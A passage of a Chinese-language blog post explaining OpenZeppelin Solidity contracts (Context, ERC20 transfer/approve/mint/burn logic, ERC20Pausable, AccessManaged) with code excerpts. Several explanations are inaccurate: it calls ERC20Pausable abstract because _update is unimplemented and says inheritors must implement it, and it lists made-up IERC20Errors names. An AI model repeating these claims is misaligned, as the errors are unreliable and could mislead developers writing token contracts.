<p>这段代码定义了一个名为<code>Context</code>的抽象合约。这个合约主要用于提供关于当前执行上下文的信息，包括交易的发送者和数据。在处理元交易（meta-transactions）时，发送和支付执行费用的账户可能不是实际的应用程序发送者。</p>
<h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><ol>
<li><p><strong><code>_msgSender()</code>函数</strong>：这个函数返回当前交易的发送者地址。在大多数情况下，这可以通过<code>msg.sender</code>直接获取，但在处理元交易时，这个值可能不是实际的发送者。因此，这个函数提供了一个抽象层，允许子合约重写它以提供正确的发送者地址。</p>
</li>
<li><p><strong><code>_msgData()</code>函数</strong>：这个函数返回当前交易的输入数据。同样，在大多数情况下，这可以通过<code>msg.data</code>直接获取，但在处理元交易时，这个值可能不是实际的输入数据。因此，这个函数提供了一个抽象层，允许子合约重写它以提供正确的输入数据。</p>
</li>
<li><p><strong><code>_contextSuffixLength()</code>函数</strong>：这个函数返回一个长度值，表示上下文后缀的长度。这个函数在处理元交易时可能有用，但在这个合约中默认返回0，表示没有上下文后缀。</p>
</li>
</ol>
<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p><code>Context</code>合约的主要用途是为那些需要访问当前执行上下文信息的合约提供基础。例如，如果一个合约需要知道是谁发送了交易，或者交易中包含了哪些数据，它可以继承<code>Context</code>合约并使用<code>_msgSender()</code>和<code>_msgData()</code>函数。</p>
<h3 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li><strong>继承</strong>：任何需要使用<code>Context</code>合约功能的合约都应该继承它。如果子合约需要提供不同的发送者或数据，它应该重写<code>_msgSender()</code>和<code>_msgData()</code>函数。</li>
<li><strong>元交易</strong>：处理元交易时，发送和支付执行费用的账户可能不是实际的发送者。因此，任何依赖于<code>msg.sender</code>或<code>msg.data</code>的合约都需要能够处理这种情况。</li>
<li><strong>安全性</strong>：在重写<code>_msgSender()</code>和<code>_msgData()</code>函数时，需要确保提供的信息是安全的，以防止潜在的安全漏洞。</li>
</ul>
<h1 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/ERC20.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">import &#123;IERC20&#125; from &quot;./IERC20.sol&quot;;</span><br><span class="line">import &#123;IERC20Metadata&#125; from &quot;./extensions/IERC20Metadata.sol&quot;;</span><br><span class="line">import &#123;Context&#125; from &quot;../../utils/Context.sol&quot;;</span><br><span class="line">import &#123;IERC20Errors&#125; from &quot;../../interfaces/draft-IERC6093.sol&quot;;</span><br><span class="line"></span><br><span class="line">abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors &#123;</span><br><span class="line"> ...</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>定义了一个名为 ERC20 的抽象合约，它继承了四个接口：Context、IERC20、IERC20Metadata 和 IERC20Errors。</p>
<ol>
<li>abstract contract ERC20</li>
</ol>
<ul>
<li>abstract contract 表示这是一个抽象合约，不能直接实例化。它通常用于定义接口和共享逻辑，其他合约可以继承它。</li>
<li>ERC20 是合约的名称。</li>
</ul>
<ol start="2">
<li>is Context, IERC20, IERC20Metadata, IERC20Errors</li>
</ol>
<ul>
<li>Context 是一个包含上下文相关函数（如 msg.sender）的接口，通常用于简化合约编写。</li>
<li>IERC20 是 ERC20 标准的接口，定义了 ERC20 代币的基本功能，如 totalSupply、balanceOf、transfer 等。</li>
<li>IERC20Metadata 是 ERC20 标准的扩展接口，定义了代币的元数据，如 name、symbol 和 decimals。</li>
<li>IERC20Errors 是一个自定义的接口，通常用于定义合约中可能出现的错误，如 TransferFailedError、InsufficientBalanceError 等。</li>
</ul>
<h3 id="合约成员"><a href="#合约成员" class="headerlink" title="合约成员"></a>合约成员</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mapping(address account =&gt; uint256) private _balances;</span><br><span class="line"></span><br><span class="line">mapping(address account =&gt; mapping(address spender =&gt; uint256)) private _allowances;</span><br><span class="line"></span><br><span class="line">uint256 private _totalSupply;</span><br><span class="line"></span><br><span class="line">string private _name;</span><br><span class="line">string private _symbol;</span><br></pre></td></tr></table></figure>

<ol>
<li><p><strong>_balances</strong>:</p>
<ul>
<li>这是一个映射（mapping），用于存储每个账户的代币余额。</li>
<li><code>address account</code> 是账户地址，<code>uint256</code> 是该地址对应的代币数量。</li>
<li><code>private</code> 关键字表示这个映射只能在合约内部访问，外部无法直接访问。</li>
<li>这个映射用于跟踪每个账户的代币余额。</li>
</ul>
</li>
<li><p><strong>_allowances</strong>:</p>
<ul>
<li>这是一个嵌套的映射，用于存储每个账户授权给其他账户的代币数量。</li>
<li><code>address account</code> 是账户地址，<code>mapping(address spender =&gt; uint256)</code> 是一个映射，表示该账户授权给其他账户的代币数量。</li>
<li><code>address spender</code> 是被授权的账户地址，<code>uint256</code> 是被授权的代币数量。</li>
<li><code>private</code> 关键字表示这个映射只能在合约内部访问，外部无法直接访问。</li>
<li>这个映射用于跟踪每个账户授权给其他账户的代币数量，通常用于实现代币的转账授权功能。<br>  -</li>
</ul>
</li>
<li><p><strong>_totalSupply</strong>:</p>
<ul>
<li>这是一个无符号整数（uint256），用于存储代币的总供应量。</li>
<li><code>private</code> 关键字表示这个变量只能在合约内部访问，外部无法直接访问。</li>
<li>这个变量用于跟踪代币的总供应量。<br>  -</li>
</ul>
</li>
<li><p><strong>_name</strong>:</p>
<ul>
<li>这是一个字符串变量，用于存储代币的名称。</li>
<li><code>private</code> 关键字表示这个变量只能在合约内部访问，外部无法直接访问。</li>
<li>这个变量用于存储代币的名称，例如 “MyToken”。</li>
</ul>
</li>
<li><p><strong>_symbol</strong>:</p>
<ul>
<li>这是一个字符串变量，用于存储代币的符号。</li>
<li><code>private</code> 关键字表示这个变量只能在合约内部访问，外部无法直接访问。</li>
<li>这个变量用于存储代币的符号，例如 “MTK”。</li>
</ul>
</li>
</ol>
<h3 id="transfer-transferFrom"><a href="#transfer-transferFrom" class="headerlink" title="transfer &amp; transferFrom"></a>transfer &amp; transferFrom</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">function transfer(address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">    address owner = _msgSender();</span><br><span class="line">    _transfer(owner, to, value);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function transferFrom(address from, address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">    address spender = _msgSender();</span><br><span class="line">    _spendAllowance(from, spender, value);</span><br><span class="line">    _transfer(from, to, value);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _transfer(address from, address to, uint256 value) internal &#123;</span><br><span class="line">    if (from == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidSender(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    if (to == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidReceiver(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    _update(from, to, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _update(address from, address to, uint256 value) internal virtual &#123;</span><br><span class="line">    if (from == address(0)) &#123;</span><br><span class="line">        // Overflow check required: The rest of the code assumes that totalSupply never overflows</span><br><span class="line">        _totalSupply += value;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        uint256 fromBalance = _balances[from];</span><br><span class="line">        if (fromBalance &lt; value) &#123;</span><br><span class="line">            revert ERC20InsufficientBalance(from, fromBalance, value);</span><br><span class="line">        &#125;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            // Overflow not possible: value &lt;= fromBalance &lt;= totalSupply.</span><br><span class="line">            _balances[from] = fromBalance - value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (to == address(0)) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            // Overflow not possible: value &lt;= totalSupply or value &lt;= fromBalance &lt;= totalSupply.</span><br><span class="line">            _totalSupply -= value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.</span><br><span class="line">            _balances[to] += value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    emit Transfer(from, to, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>所有的转让动作最终都由<code>_transfer</code>方法来完成。</li>
<li><code>_transfer</code>方法中统一判断地址的有效性，使用<code>revert</code>比<code>require</code>更节省gas。</li>
<li><code>ERC20InvalidSender</code>和<code>ERC20InvalidReceiver</code>都来自<code>IERC20Errors</code>接口。</li>
</ul>
<p><strong>_update</strong></p>
<p><code>_update</code> 为内部虚函数，用于更新代币合约中的余额和总供应量。它主要用于处理代币的转移操作，确保在转移过程中不会发生溢出或不足的情况。</p>
<ol>
<li><p><strong>参数说明</strong>：</p>
<ul>
<li><code>from</code>：代币的发送者地址。</li>
<li><code>to</code>：代币的接收者地址。</li>
<li><code>value</code>：转移的代币数量。</li>
</ul>
</li>
<li><p><strong>更新总供应量</strong>：</p>
<ul>
<li>如果 <code>from</code> 是 <code>address(0)</code>，表示这是一个铸造操作（minting），那么 <code>_totalSupply</code> 将增加 <code>value</code>。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function _mint(address account, uint256 value) internal &#123;</span><br><span class="line">    if (account == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidReceiver(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    _update(address(0), account, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>如果 <code>from</code> 不是 <code>address(0)</code>，表示这是一个转移操作（transfer），那么首先检查 <code>from</code> 的余额是否足够，如果足够，则从 <code>from</code> 的余额中减去 <code>value</code>。</li>
</ul>
</li>
<li><p><strong>更新接收者的余额</strong>：</p>
<ul>
<li>如果 <code>to</code> 是 <code>address(0)</code>，表示这是一个销毁操作（burning），那么 <code>_totalSupply</code> 将减少 <code>value</code>。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function _burn(address account, uint256 value) internal &#123;</span><br><span class="line">    if (account == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidSender(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    _update(account, address(0), value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>如果 <code>to</code> 不是 <code>address(0)</code>，表示这是一个转移操作，那么将 <code>value</code> 加到 <code>to</code> 的余额中。</li>
</ul>
</li>
<li><p><strong>防止溢出</strong>：</p>
<ul>
<li>使用 <code>unchecked</code> 关键字来处理可能的溢出情况，因为代码逻辑已经确保了不会发生溢出。</li>
<li>使用 <code>unchecked</code> 可以节省gas</li>
</ul>
</li>
<li><p><strong>触发事件</strong>：</p>
<ul>
<li>最后，通过 <code>emit Transfer(from, to, value);</code> 触发一个 <code>Transfer</code> 事件，记录这次转移操作。</li>
</ul>
</li>
</ol>
<h3 id="approve"><a href="#approve" class="headerlink" title="approve"></a>approve</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">function transferFrom(address from, address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">    address spender = _msgSender();</span><br><span class="line">    _spendAllowance(from, spender, value);</span><br><span class="line">    _transfer(from, to, value);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _approve(address owner, address spender, uint256 value) internal &#123;</span><br><span class="line">    _approve(owner, spender, value, true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual &#123;</span><br><span class="line">    if (owner == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidApprover(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    if (spender == address(0)) &#123;</span><br><span class="line">        revert ERC20InvalidSpender(address(0));</span><br><span class="line">    &#125;</span><br><span class="line">    _allowances[owner][spender] = value;</span><br><span class="line">    if (emitEvent) &#123;</span><br><span class="line">        emit Approval(owner, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _spendAllowance(address owner, address spender, uint256 value) internal virtual &#123;</span><br><span class="line">    uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">    if (currentAllowance != type(uint256).max) &#123;</span><br><span class="line">        if (currentAllowance &lt; value) &#123;</span><br><span class="line">            revert ERC20InsufficientAllowance(spender, currentAllowance, value);</span><br><span class="line">        &#125;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _approve(owner, spender, currentAllowance - value, false);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>_approve</code>函数</strong></p>
<p><code>_approve</code>函数用于更新一个账户对另一个账户的授权额度。如果<code>emitEvent</code>参数为<code>true</code>，还会触发一个<code>Approval</code>事件。</p>
<pre><code>- `owner`：授权额度所有者的地址。
- `spender`：被授权的账户地址。
- `value`：授权的额度。
- `emitEvent`：一个布尔值，决定是否触发`Approval`事件。
</code></pre>
<p><strong>流程</strong></p>
<ol>
<li>首先检查<code>owner</code>和<code>spender</code>是否为<code>address(0)</code>，如果是，则抛出异常<code>ERC20InvalidApprover</code>或<code>ERC20InvalidSpender</code>。</li>
<li>更新<code>_allowances</code>映射，将<code>owner</code>对<code>spender</code>的授权额度设置为<code>value</code>。</li>
<li>如果<code>emitEvent</code>为<code>true</code>，则触发<code>Approval</code>事件。</li>
</ol>
<p><strong><code>_spendAllowance</code>函数</strong></p>
<p><code>_spendAllowance</code>函数用于消耗<code>owner</code>对<code>spender</code>的授权额度。它不会更新授权额度，除非授权额度是有限的。如果授权额度不足，则会抛出异常。</p>
<pre><code>- `owner`：授权额度所有者的地址。
- `spender`：被授权的账户地址。
- `value`：要消费的额度。
</code></pre>
<p><strong>流程</strong></p>
<ol>
<li>获取<code>owner</code>对<code>spender</code>的当前授权额度。</li>
<li>如果当前授权额度不是无限（即不等于<code>type(uint256).max</code>），则检查当前授权额度是否足够消费<code>value</code>。</li>
<li>如果足够，则更新<code>owner</code>对<code>spender</code>的授权额度，减去<code>value</code>，并触发<code>Approval</code>事件（如果<code>emitEvent</code>为<code>true</code>）。</li>
</ol>
<h3 id="decimals"><a href="#decimals" class="headerlink" title="decimals"></a>decimals</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function decimals() public view virtual returns (uint8) &#123;</span><br><span class="line">    return 18;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>默认值是18， 如果想改变，只能重写<code>decimals()</code>这个方法。这种方法直接返回固定值的相比于使用成员变量存储的方式更省gas。</p>
<h1 id="ERC20Pausable"><a href="#ERC20Pausable" class="headerlink" title="ERC20Pausable"></a>ERC20Pausable</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// OpenZeppelin Contracts (last updated v5.1.0) (token/ERC20/extensions/ERC20Pausable.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">import &#123;ERC20&#125; from &quot;../ERC20.sol&quot;;</span><br><span class="line">import &#123;Pausable&#125; from &quot;../../../utils/Pausable.sol&quot;;</span><br><span class="line"></span><br><span class="line">abstract contract ERC20Pausable is ERC20, Pausable &#123;</span><br><span class="line">    /**</span><br><span class="line">     * @dev See &#123;ERC20-_update&#125;.</span><br><span class="line">     *</span><br><span class="line">     * Requirements:</span><br><span class="line">     *</span><br><span class="line">     * - the contract must not be paused.</span><br><span class="line">    */</span><br><span class="line">    function _update(address from, address to, uint256 value) internal virtual override whenNotPaused &#123;</span><br><span class="line">        super._update(from, to, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ERC20Pausable</code> 是个抽象合约，它继承了 <code>ERC20</code> 和 <code>Pausable</code> 两个合约。<code>ERC20</code> 是一个标准的代币合约接口，而 <code>Pausable</code> 是一个用于暂停合约操作的合约。</p>
<h3 id="实现原理-1"><a href="#实现原理-1" class="headerlink" title="实现原理"></a>实现原理</h3><ol>
<li><p><strong>继承关系</strong>：<code>ERC20Pausable</code> 继承了 <code>ERC20</code> 和 <code>Pausable</code> 合约，这意味着它继承了 <code>ERC20</code> 的所有功能（如代币的创建、转移、余额查询等）以及 <code>Pausable</code> 的功能（如暂停和恢复合约操作）。</p>
</li>
<li><p><strong>抽象合约</strong>：<code>ERC20Pausable</code> 是一个抽象合约，因为它包含了一个未实现的函数 <code>_update</code>。</p>
</li>
<li><p><strong>函数重写</strong>：<code>_update</code> 函数重写了 <code>ERC20</code> 合约中的 <code>_update</code> 函数。这个函数在执行代币转移操作之前，会检查合约是否处于暂停状态。如果合约处于暂停状态，则不允许执行转移操作。</p>
</li>
<li><p><strong><code>whenNotPaused</code> 修饰器</strong>：<code>whenNotPaused</code> 是 <code>Pausable</code> 合约中的一个修饰器，用于确保在调用被修饰的函数时，合约不是暂停状态。如果合约是暂停状态，调用将被 revert（回滚）。</p>
</li>
</ol>
<h3 id="用途-1"><a href="#用途-1" class="headerlink" title="用途"></a>用途</h3><p><code>ERC20Pausable</code> 合约的主要用途是提供一个可暂停的代币合约，允许合约所有者或管理员在紧急情况下暂停代币的转移操作，以防止潜在的滥用或攻击。</p>
<h3 id="注意事项-2"><a href="#注意事项-2" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
<li><p><strong>实现 <code>_update</code> 函数</strong>：任何继承 <code>ERC20Pausable</code> 的合约都必须实现 <code>_update</code> 函数，以确保在执行代币转移操作时能够正确地检查合约是否处于暂停状态。</p>
</li>
<li><p><strong>合约暂停</strong>：合约暂停后，所有与代币转移相关的操作都将被阻止，直到合约被恢复。因此，合约所有者或管理员在暂停合约时应谨慎操作，以避免造成不必要的损失。</p>
</li>
<li><p><strong>安全性</strong>：虽然 <code>ERC20Pausable</code> 合约提供了一种暂停合约的方法，但它并不能防止所有潜在的安全问题。开发者仍需确保合约的其他部分（如访问控制、逻辑错误等）是安全的。</p>
</li>
</ol>
<h1 id="AccessManaged"><a href="#AccessManaged" class="headerlink" title="AccessManaged"></a>AccessManaged</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// OpenZeppelin Contracts (last updated v5.1.0) (access/manager/AccessManaged.sol)</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">import &#123;IAuthority&#125; from &quot;./IAuthority.sol&quot;;</span><br><span class="line">import &#123;AuthorityUtils&#125; from &quot;./AuthorityUtils.sol&quot;;</span><br><span class="line">import &#123;IAccessManager&#125; from &quot;./IAccessManager.sol&quot;;</span><br><span class="line">import &#123;IAccessManaged&#125; from &quot;./IAccessManaged.sol&quot;;</span><br><span class="line">import &#123;Context&#125; from &quot;../../utils/Context.sol&quot;;</span><br><span class="line"></span><br><span class="line">abstract contract AccessManaged is Context, IAccessManaged &#123;</span><br><span class="line">    address private _authority;</span><br><span class="line"></span><br><span class="line">    bool private _consumingSchedule;</span><br><span class="line">    constructor(address initialAuthority) &#123;</span><br><span class="line">        _setAuthority(initialAuthority);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier restricted() &#123;</span><br><span class="line">        _checkCanCall(_msgSender(), _msgData());</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @inheritdoc IAccessManaged</span><br><span class="line">    function authority() public view virtual returns (address) &#123;</span><br><span class="line">        return _authority;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /// @inheritdoc IAccessManaged</span><br><span class="line">    function setAuthority(address newAuthority) public virtual &#123;</span><br><span class="line">        address caller = _msgSender();</span><br><span class="line">        if (caller != authority()) &#123;</span><br><span class="line">            revert AccessManagedUnauthorized(caller);</span><br><span class="line">        &#125;</span><br><span class="line">        if (newAuthority.code.length == 0) &#123;</span><br><span class="line">            revert AccessManagedInvalidAuthority(newAuthority);</span><br><span class="line">        &#125;</span><br><span class="line">        _setAuthority(newAuthority);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    /// @inheritdoc IAccessManaged</span><br><span class="line">    function isConsumingScheduledOp() public view returns (bytes4) &#123;</span><br><span class="line">        return _consumingSchedule ? this.isConsumingScheduledOp.selector : bytes4(0);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function _setAuthority(address newAuthority) internal virtual &#123;</span><br><span class="line">        _authority = newAuthority;</span><br><span class="line">        emit AuthorityUpdated(newAuthority);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function _checkCanCall(address caller, bytes calldata data) internal virtual &#123;</span><br><span class="line">        (bool immediate, uint32 delay) = AuthorityUtils.canCallWithDelay(</span><br><span class="line">            authority(),</span><br><span class="line">            caller,</span><br><span class="line">            address(this),</span><br><span class="line">            bytes4(data[0:4])</span><br><span class="line">        );</span><br><span class="line">        if (!immediate) &#123;</span><br><span class="line">            if (delay &gt; 0) &#123;</span><br><span class="line">                _consumingSchedule = true;</span><br><span class="line">                IAccessManager(authority()).consumeScheduledOp(caller, data);</span><br><span class="line">                _consumingSchedule = false;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                revert AccessManagedUnauthorized(caller);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>AccessManaged</code> 是个抽象合约，它继承了 <code>Context</code> 和 <code>IAccessManaged</code> 接口。这个合约的主要目的是管理合约的访问权限，确保只有授权的地址才能调用特定的函数。下面是对代码的详细解释：</p>
<h3 id="合约结构"><a href="#合约结构" class="headerlink" title="合约结构"></a>合约结构</h3><ol>
<li><p><strong>状态变量</strong>：</p>
<ul>
<li><code>_authority</code>：存储当前合约的授权地址。</li>
<li><code>_consumingSchedule</code>：一个布尔值，用于指示是否正在执行预定的操作。</li>
</ul>
</li>
<li><p><strong>构造函数</strong>：</p>
<ul>
<li><code>constructor(address initialAuthority)</code>：初始化合约，设置初始的授权地址。</li>
</ul>
</li>
<li><p><strong>修饰器</strong>：</p>
<ul>
<li><code>modifier restricted()</code>：限制函数的访问，确保只有授权的地址才能调用。这个修饰器通过调用 <code>_checkCanCall</code> 函数来检查调用者是否有权限。</li>
</ul>
</li>
<li><p><strong>接口实现</strong>：</p>
<ul>
<li><code>function authority() public view virtual returns (address)</code>：返回当前的授权地址。</li>
<li><code>function setAuthority(address newAuthority) public virtual</code>：设置新的授权地址。只有当前的授权地址才能调用这个函数。</li>
<li><code>function isConsumingScheduledOp() public view returns (bytes4)</code>：检查合约是否正在执行预定的操作。</li>
</ul>
</li>
<li><p><strong>内部函数</strong>：</p>
<ul>
<li><code>function _setAuthority(address newAuthority) internal virtual</code>：设置新的授权地址。这个函数没有访问限制，允许直接设置新的授权地址。</li>
<li><code>function _checkCanCall(address caller, bytes calldata data) internal virtual</code>：检查调用者是否有权限调用当前函数。如果调用者没有权限，则抛出异常。</li>
</ul>
</li>
</ol>
<h3 id="实现原理-2"><a href="#实现原理-2" class="headerlink" title="实现原理"></a>实现原理</h3><ul>
<li><strong>权限管理</strong>：通过 <code>_authority</code> 状态变量和 <code>restricted</code> 修饰器实现。只有 <code>_authority</code> 指定的地址才能调用被 <code>restricted</code> 修饰的函数。</li>
<li><strong>授权地址的设置</strong>：通过 <code>setAuthority</code> 函数设置新的授权地址，只有当前的授权地址才能调用这个函数。</li>
<li><strong>预定操作</strong>：通过 <code>_consumingSchedule</code> 和 <code>isConsumingScheduledOp</code> 函数管理预定的操作。如果合约正在执行预定的操作，<code>isConsumingScheduledOp</code> 函数会返回一个特定的函数选择器。</li>
</ul>
<h3 id="用途-2"><a href="#用途-2" class="headerlink" title="用途"></a>用途</h3><p>这个合约的主要用途是提供一个框架，用于管理合约的访问权限。通过设置授权地址，可以确保只有授权的地址才能调用合约的特定函数。这对于需要严格控制访问权限的合约非常有用，例如智能合约钱包或权限管理合约。</p>
<h3 id="注意事项-3"><a href="#注意事项-3" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li><strong>安全性</strong>：在实现权限管理时，需要特别注意不要在 <code>receive()</code> 或 <code>fallback()</code> 函数上使用 <code>restricted</code> 修饰器，因为这些函数的调用方式可能导致权限检查失败。</li>
